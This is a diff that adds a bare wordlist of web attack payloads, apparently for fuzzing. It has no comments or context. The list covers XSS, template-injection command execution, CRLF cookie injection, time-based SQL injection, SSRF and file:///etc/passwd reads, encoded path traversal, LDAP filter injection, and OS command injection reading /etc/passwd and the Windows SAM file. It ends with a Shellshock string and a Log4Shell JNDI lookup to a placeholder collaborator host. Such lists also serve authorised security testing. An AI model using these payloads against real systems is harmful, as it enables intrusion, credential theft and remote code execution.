@@ -1,0 +1,102 @@
+1 
+2
+3
+4
+5
+6
+7
+8
+9
+10
+javascript:prompt(1)
+#"><img src=/ onerror=alert(2)>
+<scr<script>ipt>alert(3)</scr<script>ipt>
+"><script>alert(4)</script>
+"><img src=x onerror=alert(5);>
+"><img src=x onerror=alert(String.fromCharCode(36));>
+<svg/onload=alert(7)>
+<iframe src="javascript:%61%6c%65%72%74%28%38%29"></iframe>
+<body onload=alert(9)>
+<video src=_ onloadstart="alert(10)">
+${{7*7}}
+{{7*7}}
+<%= 7 * 7 %>
+@(7*7)
+#{7*7}
+{{dump(app)}}
+{$smarty.version}
+{php}echo `id`;{/php}
+<%= File.open('/etc/passwd').read %>
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+%0d%0aSet-Cookie:crlf=injection
+%0aSet-Cookie:crlf=injection
+%0dSet-Cookie:crlf=injection
+%23%0aSet-Cookie:crlf=injection
+%23%0d%0aSet-Cookie:crlf=injection
+%25%30%61Set-Cookie:crlf=injection
+%250d%250aSet-Cookie:crlf=injection
+%25250d%25250aSet-Cookie:crlf=injection
+%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
+%u000aSet-Cookie:crlf=injection
+" or sleep(10)#
+' or sleep(10)#
+" or sleep(10)="
+' or sleep(10)='
+';waitfor delay '0:0:10'--
+";waitfor delay '0:0:10'--
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+" or pg_sleep(10)--
+' or pg_sleep(10)--
+http://127.0.0.1:80/
+https://127.0.0.1:443/
+http://localhost:80/
+https://localhost:443/
+http://[::]:80/
+https://[::]:443/
+http://2852039166/
+http://0177.0.0.1/
+file:///etc/passwd
+jar:http://127.0.0.1!/
+../../../../../../../../../
+..\..\..\..\..\..\..\..\..\
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af
+%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215
+%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216
+%255c%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c
+url:file:///etc/passwd
+..;/..;/..;/..;/..;/..;/..;/..;/..;/
+*
+*)(&
+*))%00
+*()|%26'
+*()|&'
+*(|(mail=*))
+*(|(objectclass=*))
+*)(uid=*))(|(uid=*
+admin*)((|userpassword=*)
+%2A%28%7C%28objectclass%3D%2A%29%29
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+& id
+";id;"
+';id;'
+;id
+|id
+;system('/usr/bin/id')
+%0A/usr/bin/id
+a)|/usr/bin/id
+`id`
+systeminfo
+| systeminfo
+; systeminfo
+& systeminfo
+&& systeminfo
+$(`type C:\boot.ini`)
+&&type C:\\boot.ini
+| type C:\Windows\repair\SAM
+; type C:\Windows\repair\SAM
+type C:\Windows\repair\SAM
+() { :;};id # RCE
+${jndi:ldap://BURP_COLLAB}
